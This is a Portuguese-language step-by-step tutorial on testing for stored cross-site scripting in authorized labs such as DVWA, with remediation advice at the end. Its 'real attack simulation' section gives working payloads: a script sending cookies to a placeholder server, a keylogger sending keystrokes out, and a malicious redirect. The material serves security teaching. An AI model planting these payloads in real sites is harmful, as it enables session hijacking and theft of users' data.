[[9 - VULN - XSS - Cross-site scripting (Stored)]]

## Procedimento: Teste de XSS Stored (Cross-Site Scripting Armazenado)

### Aviso

Este procedimento deve ser realizado apenas em ambientes controlados ou autorizados, como laboratórios de testes, plataformas CTF, ambientes DVWA, bWAPP ou aplicações desenvolvidas especificamente para fins educacionais. Nunca aplique em sistemas de terceiros sem permissão explícita.

---

### Objetivo

Demonstrar a exploração de uma vulnerabilidade do tipo XSS Stored, injetando um script malicioso que será armazenado no banco de dados da aplicação e executado automaticamente quando outro usuário acessar a página.

---

### Requisitos

- Ambiente web vulnerável (exemplo: DVWA, bWAPP ou app de testes com campos de entrada de dados).
    
- Navegador.
    
- Permissão para testar ou executar o procedimento em um ambiente isolado.
    

---

### Passo a passo

#### 1. Identifique um ponto de entrada de dados persistente

Procure áreas no sistema onde você possa **enviar dados que serão armazenados** e posteriormente **exibidos a outros usuários**. Exemplos:

- Campo de **comentários** em postagens ou produtos.
    
- Campo de **biografia/perfil de usuário**.
    
- Campo de **mensagens de fórum ou mural**.
    
- Campo de **nome do produto ou descrição**, em sistemas de administração.
    
- Campos de **formulário de contato** onde o conteúdo é exibido posteriormente em uma dashboard administrativa.
    
- Nome ou título de **arquivo enviado** que aparece na interface.
    
- Mensagens enviadas por chat e exibidas a outros usuários.
    

---

#### 2. Teste com HTML básico

No campo identificado, envie um conteúdo simples em HTML para verificar se a aplicação exibe o HTML sem sanitização:

```html
<b>Texto em negrito</b>
```

- Envie ou salve o conteúdo.
    
- Recarregue a página.
    
- Verifique se o texto aparece em negrito.
    

Se o HTML for interpretado pelo navegador, isso indica que o conteúdo não está sendo tratado corretamente. O sistema está aceitando e renderizando HTML arbitrário.

---

#### 3. Teste com payload XSS simples

Agora, envie um script simples para testar a execução de código:

```html
<script>alert("XSS Stored ativado")</script>
```

- Envie o conteúdo no campo.
    
- Recarregue a página (F5).
    
- Se o alerta for exibido, isso indica que o XSS foi armazenado com sucesso e executado no navegador — caracterizando uma vulnerabilidade do tipo **XSS Stored**.
    

---

#### 4. Simulação de ataque real

Você pode simular um ataque mais avançado, como roubo de cookies ou captura de dados, com uma payload como:

```html
<script>
  fetch("http://seuservidor.com/coletar?cookie=" + document.cookie)
</script>
```

Substitua `seuservidor.com` por um endereço controlado por você (como um servidor local com ngrok, netcat, Burp Collaborator, etc.).

Outros exemplos possíveis:

- Injetar um keylogger:
    
    ```html
    <script>
      document.onkeypress = function(e) {
        fetch('http://seuservidor.com/tecla=' + e.key);
      }
    </script>
    ```
    
- Redirecionar o usuário para outra página:
    
    ```html
    <script>window.location="http://site-malicioso.com"</script>
    ```
    

---

### Locais onde XSS Stored pode ocorrer (além de comentários)

1. Nome de usuário ou perfil.
    
2. Mensagem de chat persistente.
    
3. Biografia ou descrição pessoal.
    
4. Nome de produto ou categoria cadastrado no painel administrativo.
    
5. Nome ou descrição de arquivos enviados.
    
6. Campos de tickets ou chamados técnicos.
    
7. Mensagens de mural ou postagens de blog.
    
8. Relatórios ou logs exibidos em dashboards.
    
9. Campos de sugestão pública (caixa de ideias, fóruns).
    
10. Campos exibidos para outros usuários por meio de templates dinâmicos (ex: emails, alertas de sistema).
    

---

### Recomendações de correção

- Escapar caracteres especiais como `<`, `>`, `"`, `'`, `&`.
    
- Usar bibliotecas de sanitização (ex: DOMPurify no frontend ou HTMLPurifier no backend).
    
- Validar e limpar os dados no backend antes de armazenar.
    
- Implementar cabeçalhos de segurança como Content-Security-Policy (CSP).
    
- Desabilitar a renderização de HTML onde não for necessária.
